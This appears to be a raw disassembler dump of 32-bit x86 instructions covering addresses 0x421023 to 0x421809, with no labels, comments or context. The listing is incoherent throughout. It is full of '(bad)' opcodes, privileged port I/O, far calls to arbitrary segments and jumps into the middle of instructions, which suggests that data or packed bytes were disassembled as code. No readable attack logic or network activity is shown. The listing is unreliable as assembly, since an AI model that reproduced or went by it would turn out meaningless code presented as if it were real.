  421023:	pop    ds
  421024:	clc    
  421025:	aas    
  421026:	lods   al,BYTE PTR ds:[esi]
  421027:	fimul  WORD PTR [edx]
  421029:	sbb    ebp,DWORD PTR [edx+0x68]
  42102c:	adc    BYTE PTR [edx*2-0x23f4ce1a],cl
  421033:	lea    esi,[ebx-0x2d463b73]
  421039:	pop    edx
  42103a:	xchg   ebp,eax
  42103b:	sub    bh,BYTE PTR [edi+edi*4-0x689317ae]
  421042:	icebp  
  421043:	test   DWORD PTR ds:0xf8136458,edi
  421049:	mov    fs,WORD PTR [ecx+0x6f]
  42104c:	(bad)  
  42104d:	mov    edi,0x791b779
  421052:	ds out dx,al
  421054:	mov    ah,ch
  421056:	imul   ecx,DWORD PTR [eax+ebx*1-0x17],0x63
  42105b:	xor    esi,esi
  42105d:	adc    esi,edx
  42105f:	ret    
  421060:	mov    bh,0xa6
  421062:	call   0x6076:0xab22c61e
  421069:	inc    ecx
  42106a:	dec    esi
  42106b:	ja     0x421047
  42106d:	and    al,0x30
  42106f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421070:	jno    0x4210a0
  421072:	jne    0x4210a0
  421074:	(bad)  
  421075:	out    0x50,al
  421077:	xchg   ebp,eax
  421078:	repnz leave 
  42107a:	arpl   WORD PTR [ebx+edi*1],di
  42107d:	add    eax,0x260ddc30
  421082:	inc    eax
  421083:	(bad)  
  421084:	jmp    0x4210ca
  421086:	les    eax,FWORD PTR [edi+0x6e]
  421089:	icebp  
  42108a:	inc    ecx
  42108b:	sbb    DWORD PTR [eax-0x2d],ebx
  42108e:	sub    BYTE PTR [esi-0x68],cl
  421091:	mov    al,ds:0x9afc57f7
  421096:	adc    DWORD PTR [edi+ebx*8-0x52fdf012],edx
  42109d:	xor    DWORD PTR [esi],ebp
  42109f:	mov    ch,0xdd
  4210a1:	call   0xfc2b2d12
  4210a6:	jmp    0xbaf1:0x2b23b51c
  4210ad:	sti    
  4210ae:	mov    cl,0xfb
  4210b0:	loopne 0x4210f2
  4210b2:	fwait
  4210b3:	ror    DWORD PTR [edi+0x3625d851],1
  4210b9:	xor    dl,BYTE PTR [eax]
  4210bb:	push   ds
  4210bc:	xchg   ebp,eax
  4210bd:	push   ecx
  4210be:	ja     0x4210ad
  4210c0:	add    ch,BYTE PTR [ecx+0x4e]
  4210c3:	inc    eax
  4210c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210c5:	imul   esi,DWORD PTR [edi-0x63],0xf0e7b814
  4210cc:	sbb    eax,0xeb19fc72
  4210d1:	ffreep st(3)
  4210d3:	fst    DWORD PTR [esi+0x22]
  4210d6:	lock or BYTE PTR [edi-0x68],0x9
  4210db:	scas   eax,DWORD PTR es:[edi]
  4210dc:	mov    al,ds:0xee00fc9d
  4210e1:	inc    ecx
  4210e2:	test   al,0x74
  4210e4:	stc    
  4210e5:	dec    eax
  4210e6:	js     0x4210c3
  4210e8:	mov    edi,0x687ed98
  4210ed:	in     eax,dx
  4210ee:	(bad)  
  4210ef:	jb     0x4210af
  4210f1:	sub    BYTE PTR [ecx-0x1e4e6da6],ah
  4210f7:	mov    bl,BYTE PTR [edx+0x3ba7212d]
  4210fd:	or     eax,0x377c34c1
  421102:	push   ebx
  421103:	out    dx,eax
  421104:	mov    ebx,DWORD PTR [ecx+eax*1]
  421107:	push   ebp
  421108:	and    esp,DWORD PTR [eax+0x19]
  42110b:	jns    0x42116d
  42110d:	in     al,0xeb
  42110f:	push   ds
  421110:	pop    eax
  421111:	fs ret 0xfa36
  421115:	cmp    ch,BYTE PTR [edx]
  421117:	fs test eax,0xec77fdbf
  42111d:	sub    edx,ebx
  42111f:	fdiv   DWORD PTR [eax]
  421121:	fs add edi,eax
  421124:	ret    0x91c6
  421127:	test   BYTE PTR [ebx],bh
  421129:	fild   DWORD PTR [esi+0x2a]
  42112c:	xchg   edx,eax
  42112d:	test   DWORD PTR [eax+ebp*4],edx
  421130:	sbb    eax,DWORD PTR [edi+0x59]
  421133:	pusha  
  421134:	jae    0x4210d6
  421136:	sub    bl,BYTE PTR [ebx]
  421138:	shr    BYTE PTR fs:[ebx+0x7a01aa88],1
  42113f:	in     al,dx
  421140:	jg     0x42110e
  421142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421143:	in     al,0x8e
  421145:	scas   al,BYTE PTR es:[edi]
  421146:	xchg   edx,eax
  421147:	das    
  421148:	pop    es
  421149:	adc    bl,cl
  42114b:	(bad)  
  42114c:	fnstcw WORD PTR [esi]
  42114e:	mov    edx,0xc4a5005f
  421153:	lods   eax,DWORD PTR cs:[esi]
  421155:	retf   0xbe5e
  421158:	jmp    0x8ab0c24
  42115d:	xor    eax,0xccec928b
  421162:	icebp  
  421163:	pop    ebx
  421164:	repnz fwait
  421166:	inc    esi
  421167:	inc    ebx
  421168:	xchg   edx,eax
  421169:	inc    esi
  42116a:	or     DWORD PTR [edx],esi
  42116c:	sbb    ebp,DWORD PTR [eax]
  42116e:	stos   DWORD PTR es:[edi],eax
  42116f:	and    bl,BYTE PTR gs:[edi-0x471672e6]
  421176:	scas   al,BYTE PTR es:[edi]
  421177:	push   ebx
  421178:	pushf  
  421179:	push   0xffffffec
  42117b:	sub    bl,BYTE PTR [esi]
  42117d:	add    BYTE PTR [eax],al
  42117f:	add    BYTE PTR [eax],al
  421181:	add    BYTE PTR [edi+0x5b2a13cf],al
  421187:	(bad)  
  421188:	mov    edi,0x5549c1ef
  42118d:	cmp    BYTE PTR [edx],cl
  42118f:	clc    
  421190:	inc    edx
  421191:	push   ecx
  421192:	cwde   
  421193:	mov    eax,DWORD PTR [ecx]
  421195:	add    bl,dh
  421197:	add    al,0x0
  421199:	add    BYTE PTR [ebx+0x65561960],ah
  42119f:	idiv   DWORD PTR [eax+0x5a36e0e0]
  4211a5:	sub    esp,ebx
  4211a7:	lds    esp,FWORD PTR [edi]
  4211a9:	out    dx,eax
  4211aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211ab:	je     0x421148
  4211ad:	mov    ebx,0x2e8f35d0
  4211b2:	push   0x4d
  4211b4:	pop    ebx
  4211b5:	cmp    ebx,DWORD PTR [edx-0x13ce649e]
  4211bb:	mov    esi,0xbc54227c
  4211c0:	ret    0x1e4f
  4211c3:	mov    dh,0xb9
  4211c5:	sbb    DWORD PTR [eax-0x75],edx
  4211c8:	add    esp,DWORD PTR [eax]
  4211ca:	sub    ebx,ecx
  4211cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211cd:	xchg   eax,edi
  4211cf:	aas    
  4211d0:	ret    0x635d
  4211d3:	ss cmp eax,0x6736451a
  4211d9:	call   0x9fed20a7
  4211de:	add    al,0xf7
  4211e0:	in     eax,dx
  4211e1:	outs   dx,DWORD PTR ds:[esi]
  4211e2:	test   DWORD PTR [edx+ecx*4],ebp
  4211e5:	inc    ecx
  4211e6:	inc    esi
  4211e7:	and    al,0xdc
  4211e9:	call   0xb0e7:0x3e802a42
  4211f0:	or     al,0x96
  4211f2:	xchg   BYTE PTR [eax],al
  4211f4:	dec    esi
  4211f5:	xor    dh,BYTE PTR ds:0x1e55aa4d
  4211fb:	inc    esi
  4211fc:	retf   
  4211fd:	jb     0x4211ac
  4211ff:	push   0xc1cd4298
  421204:	(bad)  [ecx+0x22]
  421207:	add    DWORD PTR [esi],esi
  421209:	fdiv   QWORD PTR [eax+ebp*2+0x4b9dcafc]
  421210:	cli    
  421211:	add    ah,ch
  421213:	or     cl,BYTE PTR [eax]
  421215:	mov    eax,ds:0x153d7bae
  42121a:	div    DWORD PTR [ecx]
  42121c:	dec    eax
  42121d:	push   ebx
  42121e:	xchg   ecx,eax
  42121f:	loope  0x421260
  421221:	es mov ebx,0x4d9b757e
  421227:	int3   
  421228:	loopne 0x42129c
  42122a:	lods   eax,DWORD PTR ds:[esi]
  42122b:	aam    0xb8
  42122d:	sbb    al,0x55
  42122f:	aam    0xc1
  421231:	mov    DWORD PTR [eax+0x68],esp
  421234:	addr16 pop esp
  421236:	add    esp,DWORD PTR [ebp-0x6450cb4a]
  42123c:	sbb    DWORD PTR es:[edi-0x69],eax
  421240:	aad    0xb6
  421242:	dec    edx
  421243:	mov    bl,0x90
  421245:	xor    edx,eax
  421247:	in     al,0xf6
  421249:	push   ebp
  42124a:	shl    BYTE PTR [eax+0x63],1
  42124d:	sar    BYTE PTR [edi+esi*8-0x2b],0xbc
  421252:	fbld   TBYTE PTR [ecx+0x42]
  421255:	jmp    0x4211dc
  421257:	jbe    0x4211f4
  421259:	call   FWORD PTR [ecx+0x6]
  42125c:	ror    ah,cl
  42125e:	pushf  
  42125f:	adc    eax,0x3379b27a
  421264:	inc    edx
  421265:	loop   0x42121c
  421267:	arpl   WORD PTR [ecx-0x6e],di
  42126a:	aaa    
  42126b:	and    BYTE PTR [ecx+0x1c21257f],ch
  421271:	(bad)  
  421272:	mov    ds:0xf73bdee3,al
  421277:	adc    cl,BYTE PTR [edi]
  421279:	test   DWORD PTR [ebp+0x45e1cef8],eax
  42127f:	adc    al,0xdf
  421281:	out    0x5d,al
  421283:	dec    edi
  421284:	mov    ebx,0x6dfa889e
  421289:	cli    
  42128a:	rol    DWORD PTR [ebx-0x72],0xa8
  42128e:	inc    esp
  42128f:	not    DWORD PTR [eax-0x77eb5f01]
  421295:	mov    cs,eax
  421297:	mov    ds:0x23f264cd,eax
  42129c:	sub    BYTE PTR [edx+0x60],al
  42129f:	repz mov dl,0x1d
  4212a2:	mov    al,ds:0x7a6da36
  4212a7:	jmp    0x25e65bb1
  4212ac:	sub    ecx,DWORD PTR [edx]
  4212ae:	cmp    ecx,DWORD PTR [edx-0x4e]
  4212b1:	add    al,0xe5
  4212b3:	sbb    BYTE PTR [esi+edi*2+0x2629bd6e],0x47
  4212bb:	mov    esi,DWORD PTR [edi+0x697d0f17]
  4212c1:	jbe    0x421304
  4212c3:	cli    
  4212c4:	mov    al,ds:0xbc61b6dd
  4212c9:	jge    0x4212b0
  4212cb:	jmp    0x4212b9
  4212cd:	and    ch,bl
  4212cf:	or     DWORD PTR [ebx+0x28],ebx
  4212d2:	xor    BYTE PTR [esi+edi*8],al
  4212d5:	(bad)  
  4212d7:	cmc    
  4212d8:	lds    esi,FWORD PTR [eax+0x0]
  4212db:	sbb    ebx,eax
  4212dd:	les    ecx,FWORD PTR [edx]
  4212df:	mov    edi,0xe74acbb9
  4212e4:	cli    
  4212e5:	xchg   DWORD PTR [ebx+0xffdbf5d],ebx
  4212eb:	mov    dh,0x51
  4212ed:	cmc    
  4212ee:	pop    ebx
  4212ef:	and    BYTE PTR [ebp-0x35],0xb2
  4212f3:	inc    esi
  4212f4:	mov    edi,0x93dc8d8f
  4212f9:	mov    WORD PTR [edx-0x45],gs
  4212fc:	and    ecx,esi
  4212fe:	scas   al,BYTE PTR es:[edi]
  4212ff:	sar    DWORD PTR [ebx-0x32edba69],cl
  421305:	out    dx,eax
  421306:	add    al,0x40
  421308:	repz repnz cwde 
  42130b:	pusha  
  42130c:	push   ecx
  42130d:	out    dx,eax
  42130e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42130f:	les    esp,FWORD PTR [ebx]
  421311:	in     al,0xc7
  421313:	mov    ch,0x4d
  421315:	jge    0x421383
  421317:	mov    esp,ecx
  421319:	xchg   ebp,eax
  42131a:	test   al,0x16
  42131c:	pop    ecx
  42131d:	data16 jb 0x421345
  421320:	inc    ebx
  421321:	test   BYTE PTR [esi+eax*8+0x31],dh
  421325:	mov    BYTE PTR [edi],bl
  421327:	or     eax,0x5b1fea2b
  42132c:	dec    edx
  42132d:	les    ebx,FWORD PTR [esi+0x2e150521]
  421333:	cli    
  421334:	cs ins BYTE PTR es:[edi],dx
  421336:	mov    ecx,DWORD PTR [edi-0x7d]
  421339:	inc    ebp
  42133a:	push   eax
  42133b:	dec    esp
  42133c:	neg    BYTE PTR [eax]
  42133e:	inc    ecx
  42133f:	pushf  
  421340:	std    
  421341:	push   eax
  421342:	mov    ah,BYTE PTR fs:[edi]
  421345:	inc    edi
  421346:	lods   al,BYTE PTR ds:[esi]
  421347:	lock mov esp,0xeec823ad
  42134d:	ret    0x5bb
  421350:	aaa    
  421351:	mov    eax,0x5c4cfe5c
  421356:	mov    esp,0x4cef2109
  42135b:	call   0xf649:0x1bd50490
  421362:	push   0x22baae30
  421367:	int3   
  421368:	mov    esi,0xb3984046
  42136d:	lahf   
  42136e:	scas   al,BYTE PTR es:[edi]
  42136f:	xchg   edx,eax
  421370:	xor    al,0xcc
  421372:	loope  0x4213d6
  421374:	repz mov ebp,0x65d26634
  42137a:	mov    ebp,0x588299c1
  42137f:	xor    al,0xe7
  421381:	outs   dx,DWORD PTR ds:[esi]
  421382:	ins    DWORD PTR es:[edi],dx
  421383:	jae    0x42134a
  421385:	je     0x421338
  421387:	inc    esi
  421388:	mov    WORD PTR [ebp-0x2],ss
  42138b:	sbb    eax,0x8ed81f2a
  421390:	rcr    DWORD PTR [edx+0x60e6849f],1
  421396:	je     0x4213ca
  421398:	jg     0x4213e0
  42139a:	leave  
  42139b:	dec    esp
  42139c:	je     0x421342
  42139e:	inc    ebx
  42139f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a0:	add    BYTE PTR [ecx+ebp*2+0x3d5941e7],0x77
  4213a8:	imul   edx,ebp,0x4911ce4e
  4213ae:	pop    ds
  4213af:	push   edx
  4213b0:	aaa    
  4213b1:	out    0x21,al
  4213b3:	and    ebx,DWORD PTR [edx+0x48]
  4213b6:	sysenter 
  4213b8:	inc    esi
  4213b9:	pop    ebp
  4213ba:	rcr    BYTE PTR [ebx+0x309502a6],0xd4
  4213c1:	xchg   esi,eax
  4213c2:	jbe    0x4213d2
  4213c4:	fdivr  QWORD PTR [edi]
  4213c6:	dec    edi
  4213c7:	loopne 0x421362
  4213c9:	mov    ebp,0x44e28aad
  4213ce:	xchg   edi,eax
  4213cf:	in     eax,dx
  4213d0:	cli    
  4213d1:	stc    
  4213d2:	inc    ebp
  4213d3:	xchg   BYTE PTR [edx+0xd],al
  4213d6:	mov    ds:0x39a23f5d,al
  4213db:	gs jns 0x421458
  4213de:	fwait
  4213df:	jecxz  0x4213e3
  4213e1:	dec    edx
  4213e2:	repnz mov ss,WORD PTR [edi]
  4213e5:	mov    eax,0xd29762bf
  4213ea:	jle    0x421462
  4213ec:	xlat   BYTE PTR ds:[ebx]
  4213ed:	dec    esi
  4213ee:	xor    dh,BYTE PTR [eax]
  4213f0:	pop    edx
  4213f1:	jne    0x4213c5
  4213f3:	call   0xb80288c1
  4213f8:	pop    ebx
  4213f9:	adc    bl,al
  4213fb:	xchg   ebx,eax
  4213fc:	jle    0x421380
  4213fe:	adc    al,0x61
  421400:	push   cs
  421401:	xlat   BYTE PTR ds:[ebx]
  421402:	clc    
  421403:	imul   edx,DWORD PTR [ebx-0x1dbcd47],0xd532bf45
  42140d:	mov    ds:0xf34f69e9,eax
  421412:	add    al,0xc1
  421414:	out    0xf7,al
  421416:	loope  0x421484
  421418:	add    esp,DWORD PTR [edi-0x3e98a262]
  42141e:	and    DWORD PTR [edx+0x1a922cc3],edx
  421424:	inc    ecx
  421425:	ins    BYTE PTR es:[edi],dx
  421426:	dec    ecx
  421427:	add    al,0x47
  421429:	add    BYTE PTR gs:[esi],ch
  42142c:	fadd   DWORD PTR [ebx+0x43]
  42142f:	fwait
  421430:	sub    ah,ah
  421432:	sar    BYTE PTR [edi],1
  421434:	pop    ebp
  421435:	adc    al,0x50
  421437:	shl    DWORD PTR [eax+0x221be537],1
  42143d:	in     al,dx
  42143e:	or     ecx,DWORD PTR [eax]
  421440:	add    ebx,DWORD PTR [esi]
  421442:	mov    BYTE PTR [ecx-0x14],dh
  421445:	xor    esp,ebx
  421447:	hlt    
  421448:	jnp    0x421440
  42144a:	inc    esp
  42144b:	sub    bh,BYTE PTR [ebp-0x5a2cb19d]
  421451:	or     ebx,eax
  421453:	xchg   ebx,eax
  421454:	jno    0x42146a
  421456:	jo     0x42140e
  421458:	pop    ebp
  421459:	int    0x9b
  42145b:	rcr    DWORD PTR [ecx],0xff
  42145e:	mov    eax,DWORD PTR ds:0x152095d2
  421464:	jge    0x421447
  421466:	mov    ebx,DWORD PTR [ecx]
  421468:	push   esi
  421469:	in     al,0x2
  42146b:	add    esi,ebx
  42146d:	dec    edx
  42146e:	mov    dl,0x74
  421470:	dec    edx
  421471:	fwait
  421472:	jae    0x42148d
  421474:	adc    eax,0x484998f9
  421479:	add    edi,ebp
  42147b:	and    al,0x4b
  42147d:	mov    al,0xc1
  42147f:	lea    edi,[ecx]
  421481:	dec    esp
  421482:	repz sbb eax,0xff13b7c3
  421488:	shl    BYTE PTR [ebp*4+0x11729e9c],0xea
  421490:	fldenv [ecx+0x5e]
  421493:	mov    al,0x13
  421495:	rcr    BYTE PTR [edx-0x29e0977f],1
  42149b:	ss sub cl,dh
  42149e:	push   ecx
  42149f:	mov    esi,DWORD PTR [ebp+0x7c8ea57b]
  4214a5:	sahf   
  4214a6:	out    dx,al
  4214a7:	mov    ah,BYTE PTR [esi]
  4214a9:	sbb    edx,esp
  4214ab:	inc    edx
  4214ac:	xor    dl,dl
  4214ae:	jne    0x42148d
  4214b0:	add    DWORD PTR [edx-0x2a],edi
  4214b3:	mov    ds:0x9b453c4,al
  4214b8:	mov    ebx,0x7445cc0c
  4214bd:	std    
  4214be:	fdiv   QWORD PTR [ebp+0x71]
  4214c1:	xor    DWORD PTR [edx+ebp*8-0x661c82be],ebp
  4214c8:	loope  0x42147a
  4214ca:	push   es
  4214cb:	push   ecx
  4214cc:	pop    edi
  4214cd:	ins    BYTE PTR es:[edi],dx
  4214ce:	icebp  
  4214cf:	add    ebp,DWORD PTR [esi-0x16]
  4214d2:	cmp    eax,0x3f5609fd
  4214d7:	call   0x11e7ce07
  4214dc:	out    dx,al
  4214dd:	inc    esp
  4214de:	mov    ecx,0xd41f49dc
  4214e3:	mov    ds:0x3e5aebf2,al
  4214e8:	out    dx,al
  4214e9:	jnp    0x4214cb
  4214eb:	mov    al,ds:0x89b42cf
  4214f0:	mov    ch,0xd9
  4214f2:	xor    al,0x7f
  4214f4:	xor    BYTE PTR [edi-0x73c46ab0],0xbf
  4214fb:	cmp    esp,ecx
  4214fd:	iret   
  4214fe:	test   DWORD PTR [eax+0x6009821b],ebx
  421504:	mov    dl,0x2
  421506:	stos   DWORD PTR es:[edi],eax
  421507:	pcmpgtd mm5,QWORD PTR [eax-0x5f2dd372]
  42150e:	jmp    0x4214fb
  421510:	cdq    
  421511:	dec    ecx
  421512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421513:	add    esi,DWORD PTR [ebx]
  421515:	stc    
  421516:	and    bh,0xc
  421519:	and    dl,BYTE PTR [edi+0x61]
  42151c:	in     al,0xd3
  42151e:	paddd  mm5,QWORD PTR [esi-0x3cf722a5]
  421525:	fyl2x  
  421527:	(bad)  
  421528:	lods   eax,DWORD PTR ds:[esi]
  421529:	and    eax,0xf05a17bf
  42152e:	mov    edi,0x1ede8438
  421533:	mov    cl,0xd7
  421535:	sbb    eax,0x8a65b435
  42153a:	mov    cl,0xcf
  42153c:	push   cs
  42153d:	test   BYTE PTR [ebp-0x47b2fb52],ch
  421543:	mov    eax,0x56d5e6b3
  421548:	pushf  
  421549:	sbb    bl,BYTE PTR [edi]
  42154b:	jmp    FWORD PTR [edi]
  42154d:	mov    edi,0xc069f91a
  421552:	(bad)  
  421553:	jo     0x4214f1
  421555:	out    0x16,eax
  421557:	test   eax,0x7db022d3
  42155c:	neg    BYTE PTR [edi+0x60]
  42155f:	out    dx,eax
  421560:	ins    DWORD PTR es:[edi],dx
  421561:	clc    
  421562:	sahf   
  421563:	fdivr  QWORD PTR [esi+0x21ecd918]
  421569:	sti    
  42156a:	mov    bh,0xd0
  42156c:	aad    0x89
  42156e:	out    dx,eax
  42156f:	(bad)  
  421570:	dec    ecx
  421571:	(bad)  
  421572:	fcomp  DWORD PTR [edi+0x20]
  421575:	mov    dl,0xed
  421577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421578:	mov    BYTE PTR [esi],dh
  42157a:	push   cs
  42157b:	pop    ds
  42157c:	(bad)  
  42157d:	mov    eax,ds:0x3d164b0b
  421582:	les    ebx,FWORD PTR [edi-0x46]
  421585:	mov    dl,0x64
  421587:	or     eax,0xbc0cff3b
  42158c:	loopne 0x421553
  42158e:	fs push cs
  421590:	rcl    DWORD PTR ds:0x3bb204cd,0x76
  421597:	cmp    eax,0x24e4e906
  42159c:	not    edi
  42159e:	into   
  42159f:	cmp    BYTE PTR [ecx],al
  4215a1:	retf   
  4215a2:	ds in  al,dx
  4215a4:	mul    esp
  4215a6:	(bad)  
  4215a7:	ficom  DWORD PTR ds:0xdc265cc2
  4215ad:	test   al,0x6f
  4215af:	xchg   esi,eax
  4215b0:	inc    edi
  4215b1:	push   ds
  4215b2:	mov    edx,0x1ee06de5
  4215b7:	sub    eax,0xfccef980
  4215bc:	push   edi
  4215bd:	rcr    ah,cl
  4215bf:	and    dl,bl
  4215c1:	jne    0x4215b6
  4215c3:	inc    ebp
  4215c4:	xchg   edx,eax
  4215c5:	ss js  0x421571
  4215c8:	jbe    0x421571
  4215ca:	mov    es,WORD PTR [ebp-0x3a90ca0d]
  4215d0:	data16 sbb BYTE PTR ds:0x84b4c35c,0x5
  4215d8:	adc    ebx,ecx
  4215da:	push   ecx
  4215db:	es xchg edi,eax
  4215dd:	push   edx
  4215de:	jbe    0x4215a9
  4215e0:	cld    
  4215e1:	xchg   edx,eax
  4215e2:	jge    0x4215d8
  4215e4:	mov    bh,0x79
  4215e6:	fwait
  4215e7:	ror    BYTE PTR [ecx+0x63aa7090],cl
  4215ed:	sub    BYTE PTR fs:[esp+edx*2+0x2730e0e5],dh
  4215f5:	addr16 push cs
  4215f7:	dec    esp
  4215f8:	and    al,BYTE PTR [ecx-0x39]
  4215fb:	cmp    eax,0x7fb604e6
  421600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421601:	cmp    al,0x66
  421603:	ins    DWORD PTR es:[edi],dx
  421604:	sbb    ah,BYTE PTR [ebp+0x733518a9]
  42160a:	mov    al,0x8b
  42160c:	xchg   edx,eax
  42160d:	push   eax
  42160e:	(bad)  
  42160f:	pop    edx
  421610:	dec    ebp
  421611:	rol    ecx,1
  421613:	iret   
  421614:	mov    al,ds:0x22c1e6f6
  421619:	shl    BYTE PTR [edi+0x13],cl
  42161c:	lahf   
  42161d:	cmp    DWORD PTR gs:[ebp-0x71],edi
  421621:	push   cs
  421622:	cld    
  421623:	xor    al,0x1d
  421625:	loop   0x421608
  421627:	jb     0x4215db
  421629:	imul   edx,DWORD PTR [eax+0x5187662a],0x2167492f
  421633:	add    al,0x57
  421635:	mov    eax,0x2365345c
  42163a:	lock xchg ebx,eax
  42163c:	les    ebp,FWORD PTR [edi+0x47]
  42163f:	and    eax,0x3c548524
  421644:	mov    DWORD PTR [esi],edx
  421646:	add    ecx,DWORD PTR [edx-0x35]
  421649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42164a:	call   0xb3fbe346
  42164f:	shl    edi,0x18
  421652:	int3   
  421653:	dec    edx
  421654:	imul   eax,DWORD PTR [eax],0xffffffa6
  421657:	(bad)  
  421658:	push   ecx
  421659:	pop    esp
  42165a:	aad    0xa6
  42165c:	popf   
  42165d:	fidivr WORD PTR [edx-0xa86ace1]
  421663:	mov    WORD PTR [edi-0x1f],?
  421666:	daa    
  421667:	ja     0x42164a
  421669:	adc    cl,BYTE PTR [edi+0x5f]
  42166c:	popa   
  42166d:	fsubr  DWORD PTR [eax]
  42166f:	pop    eax
  421670:	data16 adc al,bl
  421673:	jb     0x421659
  421675:	into   
  421676:	outs   dx,BYTE PTR ds:[esi]
  421677:	shr    BYTE PTR [edi],1
  421679:	pusha  
  42167a:	mov    bl,BYTE PTR [esi]
  42167c:	pop    ebp
  42167d:	mov    ch,0xfe
  42167f:	pop    esi
  421680:	xchg   DWORD PTR [edi+0x62],ebp
  421683:	mov    ebx,0x7e4ce61d
  421688:	rcr    BYTE PTR [edi-0x57],0x5d
  42168c:	adc    eax,0x0
  421691:	add    bl,bh
  421693:	and    al,0xdc
  421695:	es (bad) 
  421698:	sti    
  421699:	std    
  42169a:	sbb    ch,BYTE PTR [edx]
  42169c:	adc    eax,0x6c5301c6
  4216a1:	aas    
  4216a2:	mov    edx,DWORD PTR [eax+0x4f30001]
  4216a8:	add    BYTE PTR [eax],al
  4216aa:	push   cs
  4216ab:	push   0x12
  4216ad:	mov    ebp,0x72befb08
  4216b2:	sar    DWORD PTR [esi-0x6ff82aa4],cl
  4216b8:	cld    
  4216b9:	add    BYTE PTR [esi],ah
  4216bb:	and    eax,0x71515de5
  4216c0:	int    0x1b
  4216c2:	rcr    BYTE PTR [ebx],0x5c
  4216c5:	clc    
  4216c6:	adc    al,0x5f
  4216c8:	mov    ebp,0x7f848ad0
  4216cd:	inc    edx
  4216ce:	push   esi
  4216cf:	add    bh,dl
  4216d1:	pop    edx
  4216d2:	test   DWORD PTR [ebp-0x5b],esp
  4216d5:	arpl   WORD PTR [ebx],cx
  4216d7:	pop    esp
  4216d8:	xchg   ebp,eax
  4216d9:	sbb    edi,ecx
  4216db:	pop    ecx
  4216dc:	cli    
  4216dd:	dec    esi
  4216de:	dec    edi
  4216df:	and    BYTE PTR [edx+0x3],bl
  4216e2:	cdq    
  4216e3:	pop    es
  4216e4:	lds    edx,FWORD PTR [esi]
  4216e6:	jg     0x4216a2
  4216e8:	sbb    ch,BYTE PTR [edi+0x11f3984d]
  4216ee:	xchg   DWORD PTR [eax],ebx
  4216f0:	sar    BYTE PTR [eax],0xce
  4216f3:	out    0x16,eax
  4216f5:	imul   edi,edi,0x4cccd9c8
  4216fb:	cmc    
  4216fc:	mov    ds:0xe705e126,al
  421701:	or     eax,0xb55913
  421706:	push   edx
  421707:	nop
  421708:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42170a:	push   ebx
  42170b:	sub    ch,BYTE PTR [ecx+0x64]
  42170e:	enter  0xd089,0xa0
  421712:	mov    bl,0x59
  421714:	cmp    eax,0x5508de80
  421719:	jecxz  0x4216e2
  42171b:	xchg   cl,ch
  42171d:	out    0x9a,eax
  42171f:	xor    ah,al
  421721:	btr    DWORD PTR [esi],ebx
  421724:	xchg   BYTE PTR [esi+0x2b9fe9a2],bl
  42172a:	sub    DWORD PTR [ecx],0x30
  42172d:	and    dh,BYTE PTR [edi+0x79]
  421730:	cmp    ch,BYTE PTR [esi-0x22c15755]
  421736:	xchg   esp,eax
  421737:	stc    
  421738:	cs int 0x92
  42173b:	xlat   BYTE PTR ds:[ebx]
  42173c:	aad    0xa9
  42173e:	pause  
  421740:	repz out dx,al
  421742:	hlt    
  421743:	xchg   esi,eax
  421744:	ss jae 0x421793
  421747:	mov    eax,0x9ef6235a
  42174c:	imul   esi,DWORD PTR [edx+0x713c5b1e],0x7477044f
  421756:	pop    ebx
  421757:	ror    DWORD PTR [ebp-0x77bd00f6],cl
  42175d:	fsubr  st(5),st
  42175f:	fild   QWORD PTR [ecx+0x59cc0a69]
  421765:	fwait
  421766:	cwde   
  421767:	pushf  
  421768:	xchg   ebx,eax
  421769:	pop    esp
  42176a:	iret   
  42176b:	test   eax,0x6bbbd6df
  421770:	push   eax
  421771:	dec    esi
  421772:	pop    ebx
  421773:	outs   dx,BYTE PTR ds:[esi]
  421774:	ja     0x4217da
  421776:	(bad)  
  421777:	mov    WORD PTR [ecx-0x10255054],?
  42177d:	push   edx
  42177e:	repz add DWORD PTR [ebp-0xaffe7e9],0x1d
  421786:	dec    ebx
  421787:	or     ecx,ecx
  421789:	xchg   ecx,eax
  42178a:	and    eax,0xce8d4dac
  42178f:	sbb    DWORD PTR [ecx],esp
  421791:	inc    esp
  421792:	jmp    0x685128ab
  421797:	adc    BYTE PTR [ebp+0x20],al
  42179a:	rcr    DWORD PTR [esp+esi*8-0x4114f2f5],0x3a
  4217a2:	xchg   esi,eax
  4217a3:	dec    ecx
  4217a4:	nop
  4217a5:	push   edx
  4217a6:	(bad)  
  4217a7:	adc    dl,0x76
  4217aa:	popa   
  4217ab:	popa   
  4217ac:	xor    BYTE PTR [eax],al
  4217ae:	pop    ss
  4217af:	ret    0xb31c
  4217b2:	leave  
  4217b3:	add    ebx,edx
  4217b5:	xchg   bh,ch
  4217b7:	add    eax,0xc85b22d1
  4217bc:	jb     0x4217e8
  4217be:	aas    
  4217bf:	adc    BYTE PTR [ecx-0x3a],dh
  4217c2:	js     0x4217a1
  4217c4:	pushf  
  4217c5:	jmp    0x4217ec
  4217c7:	pusha  
  4217c8:	std    
  4217c9:	dec    ebx
  4217ca:	das    
  4217cb:	cmp    eax,0x62c20eb3
  4217d0:	shl    eax,1
  4217d2:	cld    
  4217d3:	aam    0x5a
  4217d5:	push   DWORD PTR [ecx+0x59eb3bf1]
  4217db:	scas   al,BYTE PTR es:[edi]
  4217dc:	xor    DWORD PTR [eax-0x38],0xe94f9628
  4217e3:	sbb    al,0x4c
  4217e5:	dec    eax
  4217e6:	pop    ebx
  4217e7:	jmp    0x421807
  4217e9:	rol    BYTE PTR [esi+0x57],0xc6
  4217ed:	test   BYTE PTR [eax+ecx*8-0x1c71111c],bl
  4217f4:	inc    ecx
  4217f5:	repz cmp eax,0xda2fee1e
  4217fb:	test   al,0xc
  4217fd:	push   eax
  4217fe:	popf   
  4217ff:	dec    edx
  421800:	aas    
  421801:	hlt    
  421802:	retf   0x9ec1
  421805:	or     BYTE PTR [ecx],0x24
  421808:	(bad)  
  421809:	shr    DWORD PTR [eax],1
